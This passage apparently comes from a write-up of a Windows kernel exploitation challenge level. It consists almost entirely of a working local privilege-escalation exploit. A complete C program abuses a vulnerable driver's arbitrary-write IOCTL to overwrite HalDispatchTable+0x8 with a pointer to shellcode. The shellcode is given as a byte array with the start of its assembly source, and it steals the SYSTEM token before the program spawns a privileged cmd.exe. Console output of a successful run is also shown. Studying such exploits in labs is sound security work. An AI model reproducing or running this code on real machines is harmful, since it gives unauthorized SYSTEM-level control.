
<p>I have used the same shellcode of previous levels to copy the system token in my process.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">E</span><span class="o">:</span><span class="err">\</span><span class="o">&gt;</span><span class="n">exploit</span><span class="p">.</span><span class="n">exe</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Search</span> <span class="n">address</span> <span class="n">of</span> <span class="n">notskrnl</span><span class="p">.</span><span class="n">exe</span><span class="p">...</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">HalDispatchTable</span> <span class="k">in</span> <span class="n">userland</span><span class="o">:</span> <span class="mh">0x401F0C60</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">HalDispatchTable</span> <span class="k">in</span> <span class="n">kernelland</span><span class="o">:</span> <span class="mh">0x27F1C60</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Search</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">...</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Copy</span> <span class="n">the</span> <span class="n">shellcode</span><span class="p">...</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Execute</span> <span class="n">NtQueryIntervalProfile</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">New</span> <span class="n">username</span><span class="o">:</span> <span class="n">Syst</span><span class="err">Þ</span><span class="n">me</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Modify</span> <span class="n">HalDispatchTable</span><span class="o">+</span><span class="mh">0x8</span> <span class="n">to</span> <span class="n">point</span> <span class="n">on</span> <span class="n">KeGetCurrentThread</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">KeGetCurrentThread</span> <span class="k">in</span> <span class="n">userland</span><span class="o">:</span> <span class="mh">0x400C92C0</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">KeGetCurrentThread</span> <span class="k">in</span> <span class="n">kernelland</span><span class="o">:</span> <span class="mh">0x26CA2C0</span>
<span class="err">[</span><span class="o">+</span><span class="err">]</span> <span class="n">Executing</span> <span class="n">a</span> <span class="n">new</span> <span class="n">command</span> <span class="n">console</span> <span class="n">to</span> <span class="k">test</span> <span class="n">it</span><span class="p">...</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;windows.h&gt;
#include &lt;winioctl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="cp">#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DEVICE_NAME "\\\\.\\3"
</span>
<span class="k">typedef</span> <span class="k">enum</span> <span class="p">{</span>
	<span class="n">SystemBasicInformation</span><span class="p">,</span> 
	<span class="n">SystemProcessorInformation</span><span class="p">,</span> 
	<span class="n">SystemPerformanceInformation</span><span class="p">,</span> 
	<span class="n">SystemTimeOfDayInformation</span><span class="p">,</span> 
	<span class="n">SystemPathInformation</span><span class="p">,</span> 
	<span class="n">SystemProcessInformation</span><span class="p">,</span> 
	<span class="n">SystemCallCountInformation</span><span class="p">,</span> 
	<span class="n">SystemDeviceInformation</span><span class="p">,</span> 
	<span class="n">SystemProcessorPerformanceInformation</span><span class="p">,</span> 
	<span class="n">SystemFlagsInformation</span><span class="p">,</span> 
	<span class="n">SystemCallTimeInformation</span><span class="p">,</span> 
	<span class="n">SystemModuleInformation</span>
<span class="p">}</span> <span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_INFORMATION_CLASS</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="n">PVOID</span> <span class="n">Reserved1</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">Reserved2</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">ImageBaseAddress</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">Id</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">Rank</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">w018</span><span class="p">;</span>
    <span class="n">WORD</span> <span class="n">NameOffset</span><span class="p">;</span>
    <span class="n">BYTE</span> <span class="n">Name</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="n">ULONG</span> <span class="n">ModulesCount</span><span class="p">;</span>
    <span class="n">SYSTEM_MODULE</span> <span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>

<span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQuerySystemInformation</span><span class="p">)(</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span>
<span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtAllocateVirtualMemory</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span><span class="p">,</span> <span class="n">ULONG_PTR</span><span class="p">,</span> <span class="n">PSIZE_T</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">);</span>
<span class="k">typedef</span> <span class="n">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span> 

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
    <span class="n">PDWORD64</span> <span class="n">where</span><span class="p">;</span>
    <span class="n">DWORD64</span> <span class="n">what</span><span class="p">;</span>
<span class="p">}</span> <span class="n">L33TNESS</span><span class="p">,</span>
<span class="o">*</span><span class="n">PL33TNESS</span><span class="p">;</span>


<span class="n">BYTE</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>  <span class="s">"</span><span class="se">\x53\x51\x52\x57\x56\x6A\xFF\x6A\xFF\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x52\x70\x48\x81\xC2\x88\x01</span><span class="s">"</span>
                    <span class="s">"</span><span class="se">\x00\x00\x48\x89\xD3\x48\x8B\x42\xF8\x48\x83\xF8\x04\x74\x19\x48\xB9\x41\x41\x41\x41\x41\x41\x41\x41\x48\x39</span><span class="s">"</span>
                    <span class="s">"</span><span class="se">\xC8\x74\x11\x48\x8B\x12\x48\x39\xDA\x74\x31\xEB\xDD\x48\x89\x54\x24\x08\xEB\x04\x48\x89\x14\x24\x48\xC7\xC1</span><span class="s">"</span>
                    <span class="s">"</span><span class="se">\xFF\xFF\xFF\xFF\x48\x39\x0C\x24\x74\xDE\x48\x39\x4C\x24\x08\x74\xD7\x5F\x5E\x48\x8B\x86\x80\x00\x00\x00\x48</span><span class="s">"</span>
                    <span class="s">"</span><span class="se">\x89\x87\x80\x00\x00\x00\x5E\x5F\x5A\x59\x5B\xC3</span><span class="s">"</span><span class="p">;</span>


<span class="kt">void</span> <span class="nf">replacePattern</span><span class="p">(</span><span class="kt">char</span> <span class="n">buffer</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">BOOL</span> <span class="n">found</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
         
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bufferSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PDWORD64</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">pattern</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">found</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
            <span class="o">*</span><span class="p">(</span><span class="n">PDWORD64</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
         
    <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
<span class="p">}</span>                    

<span class="n">PVOID</span> <span class="nf">getKernelBase</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">PVOID</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">_NtQuerySystemInformation</span> <span class="n">NtQuerySystemInformation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">sizeInfo</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">DWORD</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">moduleList</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">kernelBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ntdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't found ntdll"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">NtQuerySystemInformation</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtQuerySystemInformation"</span><span class="p">);</span>

    <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeInfo</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sizeInfo</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] NtQuerySystemInformation return 0 for information size</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">moduleList</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="n">sizeInfo</span><span class="p">);</span>
    <span class="n">error</span> <span class="o">=</span> <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">moduleList</span><span class="p">,</span> <span class="n">sizeInfo</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] NtQuerySystemInformation error: 0x%X (struct size: 0x%X)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">sizeInfo</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">moduleList</span><span class="p">);</span>
    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">kernelBase</span> <span class="o">=</span> <span class="n">moduleList</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBaseAddress</span><span class="p">;</span>
    <span class="n">free</span><span class="p">(</span><span class="n">moduleList</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">kernelBase</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">L33TNESS</span> <span class="n">l33t</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">ntoskrnl</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">originalValue</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">kernelBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">leetAddress</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">sizeofShellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
    <span class="n">_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">_NtQueryIntervalProfile</span> <span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">PVOID</span> <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">ULONG</span> <span class="n">wtf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">255</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">DWORD</span> <span class="n">sizeofUsername</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Search address of notskrnl.exe...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">ntoskrnl</span> <span class="o">=</span> <span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"ntoskrnl.exe"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ntoskrnl</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't load ntoskrnl.exe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntoskrnl</span><span class="p">,</span> <span class="s">"HalDispatchTable"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">HalDispatchTable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't found HalDispatchTable in ntoskrnl.exe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] HalDispatchTable in userland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>

    <span class="n">kernelBase</span> <span class="o">=</span> <span class="n">getKernelBase</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">kernelBase</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't find the kernel base</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">ntoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">kernelBase</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] HalDispatchTable in kernelland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">HalDispatchTable</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Search NtAllocateVirtualMemory...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtAllocateVirtualMemory</span><span class="p">)</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtAllocateVirtualMemory"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">NtAllocateVirtualMemory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with GetProcAddress : %.8x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>
   
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Copy the shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">error</span> <span class="o">=</span> <span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="o">&amp;</span><span class="n">leetAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeofShellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">error</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with NtAllocateVirtualMemory : %.8x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">error</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">replacePattern</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x4141414141414141</span><span class="p">,</span> <span class="n">GetCurrentProcessId</span><span class="p">());</span> <span class="c1">// Process PID
</span>    <span class="n">memcpy</span><span class="p">(</span><span class="n">leetAddress</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span>

    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">l33t</span><span class="p">.</span><span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
    <span class="n">l33t</span><span class="p">.</span><span class="n">what</span> <span class="o">=</span> <span class="n">leetAddress</span><span class="p">;</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_WRIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l33t</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">l33t</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">NtQueryIntervalProfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't find NtQueryIntervalProfile</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Execute NtQueryIntervalProfile</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">NtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wtf</span><span class="p">);</span>

    <span class="n">GetUserNameA</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeofUsername</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] New username: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Modify HalDispatchTable+0x8 to point on KeGetCurrentThread</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntoskrnl</span><span class="p">,</span> <span class="s">"KeGetCurrentThread"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">KeGetCurrentThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't found KeGetCurrentThread in ntoskrnl.exe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] KeGetCurrentThread in userland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">KeGetCurrentThread</span><span class="p">);</span>
    <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">KeGetCurrentThread</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">ntoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">kernelBase</span><span class="p">;</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] KeGetCurrentThread in kernelland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">KeGetCurrentThread</span><span class="p">);</span>

    <span class="n">l33t</span><span class="p">.</span><span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
    <span class="n">l33t</span><span class="p">.</span><span class="n">what</span> <span class="o">=</span> <span class="n">KeGetCurrentThread</span><span class="p">;</span>
    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_WRIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l33t</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">l33t</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Executing a new command console to test it...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span> 
    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">format</span> <span class="n">PE64</span> <span class="n">GUI</span> <span class="mi">4</span><span class="p">.</span><span class="mi">0</span>

<span class="n">start</span><span class="o">:</span>

<span class="c">; We save the registers</span>
<span class="k">push</span> <span class="n">rbx</span>
<span class="k">push</span> <span class="n">rcx</span>
<span class="k">push</span> <span class="n">rdx</span>
<span class="k">push</span> <span class="n">rdi</span>
<span class="k">push</span> <span class="n">rsi</span>

<span class="c">;--------------------------------</span>
<span class="c">; 			Stack</span>
<span class="c">;--------------------------------</span>
<span class="c">; RSP-8: EPROCESS+0x188 system</span>
<span class="c">;--------------------------------</span>
<span class="c">; RSP-4: EPROCESS+0x188 exploit</span>
<span class="c">;--------------------------------</span>
<span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
<span class="k">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>

<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">gs</span><span class="o">:</span><span class="n">qword</span> <span class="mh">0x188</span><span class="err">]</span>		<span class="c">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
<span class="k">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="err">]</span>	<span class="c">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
<span class="k">add</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x188</span> 			<span class="c">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
